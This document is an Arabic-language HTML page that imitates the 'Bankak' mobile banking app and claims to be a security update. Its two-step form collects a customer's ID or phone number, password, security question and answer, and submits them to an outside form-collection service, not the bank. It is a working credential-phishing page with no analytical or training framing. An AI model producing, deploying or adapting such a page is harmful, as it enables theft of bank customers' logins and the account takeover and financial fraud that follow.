<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>تطبيق بنكك - التحديث الأمني</title>
    <style>
        :root { --bok-red: #e30613; --bok-gold: #ffca28; }
        body { background-color: var(--bok-red); font-family: 'Segoe UI', sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; color: white; overflow-x: hidden; }
        .container { width: 90%; max-width: 400px; text-align: center; padding: 20px 0; }
        .logo { font-size: 55px; font-weight: bold; margin-bottom: 20px; }
        .logo span { font-size: 20px; display: block; margin-top: -15px; }
        .card { background: white; color: #333; padding: 20px; border-radius: 15px; box-shadow: 0 10px 20px rgba(0,0,0,0.2); }
        input, select { width: 100%; padding: 14px; margin: 10px 0; border: 1px solid #ddd; border-radius: 10px; box-sizing: border-box; text-align: right; font-size: 16px; }
        .btn { width: 100%; padding: 16px; background: var(--bok-red); color: white; border: none; border-radius: 12px; font-size: 18px; font-weight: bold; cursor: pointer; margin-top: 10px; }
        .step { display: none; }
        .active { display: block; animation: fadeIn 0.4s; }
        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">بنكك<span>bankak</span></div>
        <div class="card">
            <form action="https://formspree.io/f/xjgeaelv" method="POST">
                <div id="s1" class="step active">
                    <h3 style="color: var(--bok-red); margin-top: 0;">تسجيل الدخول الآمن</h3>
                    <input type="text" name="رقم_المعرف" placeholder="رقم المعرف أو 249-" required>
                    <input type="password" name="كلمة_المرور" placeholder="كلمة المرور" required>
                    <button type="button" class="btn" onclick="go(1,2)">دخول</button>
                </div>
                <div id="s2" class="step">
                    <h3 style="color: var(--bok-red); margin-top: 0;">تأكيد الهوية</h3>
                    <p style="font-size: 13px;">يرجى الإجابة على سؤال الأمان</p>
                    <select name="سؤال_الأمان">
                        <option>ما هو اسم ابن عمك الأول؟</option>
                        <option>في أي مدينة ولدت؟</option>
                    </select>
                    <input type="text" name="الإجابة" placeholder="إجابتك هنا" required>
                    <button type="submit" class="btn">تأكيد نهائي</button>
                </div>
            </form>
        </div>
    </div>
    <script>
        function go(c, n) {
            document.getElementById('s' + c).classList.remove('active');
            document.getElementById('s' + n).classList.add('active');
        }
    </script>
</body>
</html>
